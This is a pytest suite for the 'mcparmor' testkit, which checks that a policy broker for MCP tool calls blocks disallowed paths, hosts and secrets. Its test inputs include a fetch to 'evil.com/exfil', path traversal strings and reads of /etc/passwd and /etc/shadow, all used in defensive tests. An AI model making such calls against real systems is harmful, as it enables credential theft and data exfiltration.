"""Tests for the mcparmor testkit.

These tests require the real mcparmor binary (on PATH or via MCPARMOR_BIN).
They spin up the broker with a mock tool server and verify Layer 1 enforcement.
"""
from __future__ import annotations

import json
import os
import shutil
import tempfile
from pathlib import Path
from typing import Any, AsyncGenerator

import pytest
import pytest_asyncio

from mcparmor.testkit import (
    ArmorErrorCode,
    ArmorTestHarness,
    ArmorTestHarnessError,
    ToolCallResult,
)

# ---------------------------------------------------------------------------
# Skip if mcparmor binary is not available
# ---------------------------------------------------------------------------

_BINARY_AVAILABLE = (
    shutil.which("mcparmor") is not None
    or os.environ.get("MCPARMOR_BIN", "").strip() != ""
)
pytestmark = pytest.mark.skipif(
    not _BINARY_AVAILABLE,
    reason="mcparmor binary not found — install it or set MCPARMOR_BIN",
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def tmp_dir() -> Path:
    """Create a temporary directory for test armor.json files."""
    d = tempfile.mkdtemp(prefix="mcparmor-testkit-test-")
    yield Path(d)
    shutil.rmtree(d, ignore_errors=True)


def write_armor(
    tmp_dir: Path,
    *,
    profile: str = "sandboxed",
    filesystem: dict[str, Any] | None = None,
    network: dict[str, Any] | None = None,
    output: dict[str, Any] | None = None,
) -> str:
    """Write an armor.json file and return its path."""
    manifest: dict[str, Any] = {
        "$schema": "https://mcp-armor.com/spec/v1.0/armor.schema.json",
        "version": "1.0",
        "profile": profile,
    }
    if filesystem is not None:
        manifest["filesystem"] = filesystem
    if network is not None:
        manifest["network"] = network
    if output is not None:
        manifest["output"] = output

    armor_path = tmp_dir / "armor.json"
    armor_path.write_text(json.dumps(manifest))
    return str(armor_path)


@pytest_asyncio.fixture()
async def permissive_harness(tmp_dir: Path) -> AsyncGenerator[ArmorTestHarness, None]:
    """Harness with a permissive armor.json that allows /tmp/** read/write."""
    armor = write_armor(
        tmp_dir,
        filesystem={"read": ["/tmp/**"], "write": ["/tmp/**"]},
    )
    async with ArmorTestHarness(armor=armor) as harness:
        yield harness


@pytest_asyncio.fixture()
async def restrictive_harness(tmp_dir: Path) -> AsyncGenerator[ArmorTestHarness, None]:
    """Harness with a strict armor.json that allows nothing."""
    armor = write_armor(tmp_dir, profile="strict")
    async with ArmorTestHarness(armor=armor) as harness:
        yield harness


# ---------------------------------------------------------------------------
# Lifecycle tests
# ---------------------------------------------------------------------------

class TestLifecycle:
    """Verify the harness starts, performs the MCP handshake, and stops."""

    @pytest.mark.asyncio
    async def test_start_and_stop(self, tmp_dir: Path) -> None:
        armor = write_armor(tmp_dir)
        async with ArmorTestHarness(armor=armor) as harness:
            assert harness is not None

    @pytest.mark.asyncio
    async def test_stop_is_idempotent(self, tmp_dir: Path) -> None:
        armor = write_armor(tmp_dir)
        async with ArmorTestHarness(armor=armor) as harness:
            harness.stop()
            harness.stop()  # second call should be a no-op


# ---------------------------------------------------------------------------
# Allowed calls
# ---------------------------------------------------------------------------

class TestAllowedCalls:
    """Verify that calls within policy are forwarded to the mock tool."""

    @pytest.mark.asyncio
    async def test_allowed_path_returns_mock_response(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        permissive_harness.mock_tool_response({
            "content": [{"type": "text", "text": "file contents here"}],
        })
        result = await permissive_harness.call_tool(
            "read_file", {"path": "/tmp/allowed.txt"}
        )
        assert result.allowed
        assert not result.blocked
        assert result.error_code is None
        assert result.text == "file contents here"

    @pytest.mark.asyncio
    async def test_non_path_arguments_pass_through(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool(
            "compute", {"count": 42, "verbose": True}
        )
        assert result.allowed

    @pytest.mark.asyncio
    async def test_empty_arguments_pass_through(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool("ping")
        assert result.allowed

    @pytest.mark.asyncio
    async def test_default_mock_response_returned(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool("anything")
        assert result.allowed
        assert result.text == "mock response"


# ---------------------------------------------------------------------------
# Blocked calls — filesystem policy
# ---------------------------------------------------------------------------

class TestBlockedFilesystem:
    """Verify that path violations are blocked by the broker."""

    @pytest.mark.asyncio
    async def test_path_outside_allowlist_is_blocked(
        self, restrictive_harness: ArmorTestHarness
    ) -> None:
        result = await restrictive_harness.call_tool(
            "read_file", {"path": "/etc/passwd"}
        )
        assert result.blocked
        assert result.error_code == ArmorErrorCode.PATH_VIOLATION

    @pytest.mark.asyncio
    async def test_home_path_is_blocked(
        self, restrictive_harness: ArmorTestHarness
    ) -> None:
        result = await restrictive_harness.call_tool(
            "read_file", {"path": "~/Documents/secret.pdf"}
        )
        assert result.blocked

    @pytest.mark.asyncio
    async def test_path_traversal_is_always_blocked(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool(
            "read_file", {"path": "../../etc/passwd"}
        )
        assert result.blocked
        assert result.error_code == ArmorErrorCode.PATH_VIOLATION

    @pytest.mark.asyncio
    async def test_percent_encoded_traversal_is_blocked(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool(
            "read_file", {"path": "%2e%2e/etc/passwd"}
        )
        assert result.blocked


# ---------------------------------------------------------------------------
# Blocked calls — network policy
# ---------------------------------------------------------------------------

class TestBlockedNetwork:
    """Verify that network violations are blocked by the broker."""

    @pytest.mark.asyncio
    async def test_url_to_unlisted_host_is_blocked(
        self, tmp_dir: Path
    ) -> None:
        armor = write_armor(
            tmp_dir,
            profile="network",
            network={"allow": ["api.github.com:443"]},
        )
        async with ArmorTestHarness(armor=armor) as harness:
            result = await harness.call_tool(
                "fetch", {"url": "https://evil.com/exfil"}
            )
            assert result.blocked
            assert result.error_code == ArmorErrorCode.NETWORK_VIOLATION

    @pytest.mark.asyncio
    async def test_url_to_allowed_host_passes(
        self, tmp_dir: Path
    ) -> None:
        armor = write_armor(
            tmp_dir,
            profile="network",
            network={"allow": ["api.github.com:443"]},
        )
        async with ArmorTestHarness(armor=armor) as harness:
            result = await harness.call_tool(
                "fetch", {"url": "https://api.github.com/repos"}
            )
            assert result.allowed


# ---------------------------------------------------------------------------
# Secret scanning
# ---------------------------------------------------------------------------

class TestSecretScanning:
    """Verify that the broker scans and blocks/redacts secrets in responses."""

    @pytest.mark.asyncio
    async def test_strict_scan_blocks_response_with_aws_key(
        self, tmp_dir: Path
    ) -> None:
        armor = write_armor(
            tmp_dir,
            output={"scan_secrets": "strict"},
        )
        async with ArmorTestHarness(armor=armor) as harness:
            harness.mock_tool_response({
                "content": [{
                    "type": "text",
                    "text": "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
                }],
            })
            result = await harness.call_tool("get_config")
            assert result.blocked
            assert result.error_code == ArmorErrorCode.SECRET_BLOCKED

    @pytest.mark.asyncio
    async def test_redact_mode_replaces_secret(
        self, tmp_dir: Path
    ) -> None:
        armor = write_armor(
            tmp_dir,
            output={"scan_secrets": True},
        )
        async with ArmorTestHarness(armor=armor) as harness:
            harness.mock_tool_response({
                "content": [{
                    "type": "text",
                    "text": "key = AKIAIOSFODNN7EXAMPLE",
                }],
            })
            result = await harness.call_tool("get_config")
            assert result.allowed
            assert result.text is not None
            assert "AKIAIOSFODNN7EXAMPLE" not in result.text
            assert "[REDACTED" in result.text


# ---------------------------------------------------------------------------
# Mock reconfiguration
# ---------------------------------------------------------------------------

class TestMockReconfiguration:
    """Verify that mid-test mock reconfiguration works."""

    @pytest.mark.asyncio
    async def test_mock_response_can_change_between_calls(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        permissive_harness.mock_tool_response({
            "content": [{"type": "text", "text": "first"}],
        })
        r1 = await permissive_harness.call_tool("test_tool")
        assert r1.text == "first"

        permissive_harness.mock_tool_response({
            "content": [{"type": "text", "text": "second"}],
        })
        r2 = await permissive_harness.call_tool("test_tool")
        assert r2.text == "second"

    @pytest.mark.asyncio
    async def test_per_tool_response_overrides_default(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        permissive_harness.mock_tool_response({
            "content": [{"type": "text", "text": "default"}],
        })
        permissive_harness.mock_tool_response(
            {"content": [{"type": "text", "text": "specific"}]},
            tool_name="special_tool",
        )

        r_default = await permissive_harness.call_tool("other_tool")
        assert r_default.text == "default"

        r_specific = await permissive_harness.call_tool("special_tool")
        assert r_specific.text == "specific"


# ---------------------------------------------------------------------------
# ToolCallResult
# ---------------------------------------------------------------------------

class TestToolCallResult:
    """Verify the ToolCallResult data class."""

    @pytest.mark.asyncio
    async def test_text_property_returns_none_when_blocked(
        self, restrictive_harness: ArmorTestHarness
    ) -> None:
        result = await restrictive_harness.call_tool(
            "read_file", {"path": "/etc/passwd"}
        )
        assert result.text is None

    @pytest.mark.asyncio
    async def test_text_property_with_empty_content(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        permissive_harness.mock_tool_response({"content": []})
        result = await permissive_harness.call_tool("test_tool")
        assert result.text is None

    @pytest.mark.asyncio
    async def test_raw_response_is_full_envelope(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool("test_tool")
        assert "jsonrpc" in result.raw
        assert "id" in result.raw


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:
    """Exercise boundary conditions and unusual inputs."""

    @pytest.mark.asyncio
    async def test_deeply_nested_path_in_arguments_is_inspected(
        self, restrictive_harness: ArmorTestHarness
    ) -> None:
        result = await restrictive_harness.call_tool(
            "process",
            {"outer": {"inner": {"deep": "/etc/shadow"}}},
        )
        assert result.blocked

    @pytest.mark.asyncio
    async def test_array_of_paths_first_bad(
        self, tmp_dir: Path
    ) -> None:
        armor = write_armor(
            tmp_dir,
            filesystem={"read": ["/allowed/**"]},
        )
        async with ArmorTestHarness(armor=armor) as harness:
            result = await harness.call_tool(
                "batch_read",
                {"paths": ["/etc/passwd", "/allowed/file.txt"]},
            )
            assert result.blocked

    @pytest.mark.asyncio
    async def test_non_string_arguments_do_not_trigger_inspection(
        self, restrictive_harness: ArmorTestHarness
    ) -> None:
        result = await restrictive_harness.call_tool(
            "compute",
            {"count": 42, "enabled": False, "ratio": 3.14, "tags": [1, 2, 3]},
        )
        assert result.allowed

    @pytest.mark.asyncio
    async def test_unicode_arguments_do_not_crash(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        result = await permissive_harness.call_tool(
            "noop",
            {"label": "hello 世界 \n\t"},
        )
        assert result.allowed

    @pytest.mark.asyncio
    async def test_send_raw_tools_list(
        self, permissive_harness: ArmorTestHarness
    ) -> None:
        permissive_harness.set_tools([{
            "name": "my_tool",
            "description": "A test tool",
            "inputSchema": {"type": "object", "properties": {}},
        }])
        response = await permissive_harness.send_raw({
            "jsonrpc": "2.0",
            "id": 999,
            "method": "tools/list",
            "params": {},
        })
        assert "result" in response
        tools = response["result"]["tools"]
        assert len(tools) >= 1
